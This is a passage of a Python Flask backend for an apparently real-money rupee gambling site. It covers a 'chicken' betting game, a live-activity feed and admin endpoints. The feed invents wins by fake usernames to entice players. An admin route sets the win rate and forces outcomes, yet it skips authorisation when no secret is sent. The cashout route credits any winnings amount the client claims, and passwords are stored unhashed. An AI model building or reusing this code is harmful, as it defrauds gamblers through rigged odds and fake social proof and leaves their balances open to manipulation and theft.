        )
        user = cursor.fetchone()
        if not user or float(user["balance"]) < amount:
            cursor.execute("ROLLBACK")
            return jsonify(
                {"status": "error", "message": "Insufficient balance"}
            )

        cursor.execute(
            "UPDATE users SET balance = balance - %s, total_spins = total_spins + 1, total_wagered = total_wagered + %s WHERE username = %s",
            (amount, amount, username),
        )
        cursor.execute(
            "INSERT INTO bets (username, color, amount, status) VALUES (%s, 'chicken', %s, 'pending')",
            (username, amount),
        )
        conn.commit()

        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (username,)
        )
        updated = cursor.fetchone()
        return jsonify(
            {"status": "success", "balance": float(updated["balance"])}
        )
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/chicken/cashout", methods=["POST"])
def chicken_cashout():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    data = request.json or {}
    winnings = float(data.get("winnings", 0))
    username = session["user"]

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "UPDATE users SET balance = balance + %s, total_won = total_won + %s, consecutive_losses = 0 WHERE username = %s",
            (winnings, winnings, username),
        )
        cursor.execute(
            "UPDATE bets SET status = 'won' WHERE username = %s AND color = 'chicken' AND status = 'pending'",
            (username,),
        )
        conn.commit()
        update_daily_stats(amount=0.0, payout=winnings)

        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (username,)
        )
        updated = cursor.fetchone()
        return jsonify(
            {"status": "success", "balance": float(updated["balance"])}
        )
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/chicken/loss", methods=["POST"])
def chicken_loss():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    username = session["user"]

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "UPDATE users SET consecutive_losses = consecutive_losses + 1 WHERE username = %s",
            (username,),
        )
        cursor.execute(
            "UPDATE bets SET status = 'lost' WHERE username = %s AND color = 'chicken' AND status = 'pending'",
            (username,),
        )
        conn.commit()

        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (username,)
        )
        updated = cursor.fetchone()
        return jsonify(
            {"status": "success", "balance": float(updated["balance"])}
        )
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/live_activity", methods=["GET", "POST"])
def live_activity():
    if request.method == "POST":
        data = request.json or {}
        return jsonify({"status": "success", "data": data})

    fake_users = [
        "Rahul_9X",
        "Aman_K",
        "Vikas_Pro",
        "Rohan_Winner",
        "Priya_77",
        "Lucky_S",
        "Alex_77",
        "Karan_01",
    ]
    fake_colors = ["RED", "BLUE", "GREEN"]
    multiplier = 2.5
    amount = random.choice([200, 500, 1000, 2500, 5000])

    user = random.choice(fake_users)
    color = random.choice(fake_colors)
    payout = amount * multiplier

    data = {
        "status": "success",
        "username": user,
        "color": color,
        "amount": amount,
        "payout": payout,
        "message": f"🔥 {user} placed ₹{amount} on {color} (Won ₹{payout})!",
    }
    return jsonify(data)


@app.route("/api/admin/set_control", methods=["POST"])
def admin_set_control():
    data = request.json or {}

    if data.get("secret") and data.get("secret") != ADMIN_SECRET:
        return (
            jsonify(
                {
                    "success": False,
                    "status": "error",
                    "message": "Unauthorized request",
                }
            ),
            403,
        )

    if "win_rate" in data:
        admin_settings["global_win_rate"] = float(data["win_rate"])
    elif "winRate" in data:
        val = float(data["winRate"])
        admin_settings["global_win_rate"] = val / 100.0 if val > 1 else val

    if "emergency_lock" in data:
        admin_settings["emergency_lock"] = bool(data["emergency_lock"])
    if "force_outcome" in data:
        admin_settings["forced_outcome"] = str(data["force_outcome"])

    return jsonify(
        {
            "status": "success",
            "success": True,
            "settings": admin_settings,
            "message": f"Win rate updated to {admin_settings['global_win_rate'] * 100}%",
        }
    )


@app.route("/api/admin/house_stats", methods=["GET"])
def admin_house_stats():
    secret = request.args.get("secret")
    if secret != ADMIN_SECRET:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute(
            "SELECT total_wagered, total_payout FROM daily_house_stats WHERE date = CURRENT_DATE"
        )
        row = cursor.fetchone()
        cursor.close()
        conn.close()

        wagered = float(row["total_wagered"]) if row else 0.0
        payout = float(row["total_payout"]) if row else 0.0
        profit = wagered - payout

        return jsonify(
            {
                "status": "success",
                "total_wagered": wagered,
                "total_payout": payout,
                "house_profit": profit,
            }
        )
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route("/api/admin/create_user", methods=["POST"])
def admin_create_user():
    data = request.json or {}
    if data.get("secret") != ADMIN_SECRET:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    username = data.get("username")
    password = data.get("password")
    initial_balance = float(data.get("balance", 0.0))

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT username FROM users WHERE username = %s", (username,))
        if cursor.fetchone():
            return jsonify({"status": "error", "message": "ID Already Exist!"})

        cursor.execute(
            "INSERT INTO users (username, password, balance) VALUES (%s, %s, %s)",
            (username, password, initial_balance),
        )
        conn.commit()
        msg = f"User '{username}' created successfully with balance ₹{initial_balance}!"
        status = "success"
    except Exception as e:
        conn.rollback()
        msg = "ID Already Exist!"
        status = "error"
    finally:
        cursor.close()
        conn.close()

    return jsonify({"status": status, "message": msg})


@app.route("/api/admin/update_balance", methods=["POST"])
def admin_update_balance():
    data = request.json or {}
    if data.get("secret") != ADMIN_SECRET:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    username = data.get("username")
    action = data.get("action")

    try:
        amount = float(data.get("amount", 0.0))
    except (ValueError, TypeError):
        return jsonify(
            {"status": "error", "message": "Invalid amount format!"}
        )

    if amount <= 0:
        return jsonify(
            {"status": "error", "message": "Amount > 0 honi chahiye!"}
        )

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "SELECT balance FROM users WHERE username = %s FOR UPDATE",
            (username,),
        )
        user = cursor.fetchone()

        if not user:
            cursor.execute("ROLLBACK")
            cursor.close()
            conn.close()
            return jsonify({"status": "error", "message": "User nahi mila!"})

        current_bal = float(user["balance"] or 0.0)

        if action == "add":
            new_bal = current_bal + amount
        elif action == "deduct":
            if current_bal < amount:
                cursor.execute("ROLLBACK")
                cursor.close()
                conn.close()
                return jsonify(
                    {"status": "error", "message": "Insufficient user balance!"}
                )
            new_bal = current_bal - amount
        else:
            cursor.execute("ROLLBACK")
            cursor.close()
            conn.close()
            return jsonify({"status": "error", "message": "Invalid action!"})

        cursor.execute(
            "UPDATE users SET balance = %s WHERE username = %s",
            (new_bal, username),
        )
        conn.commit()
        cursor.close()
        conn.close()
        return jsonify(
            {
                "status": "success",
                "message": f"Updated balance for '{username}'. New balance: ₹{new_bal}",
                "new_balance": new_bal,
            }
        )
    except Exception as e:
        conn.rollback()
        cursor.close()
        conn.close()
        return jsonify({"status": "error", "message": str(e)})


if __name__ == "__main__":
    # Start Telegram Bot in a separate background thread
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()

    print("🚀 Starting Flask Server on Port 5000...")
    serve(app, host="0.0.0.0", port=5000)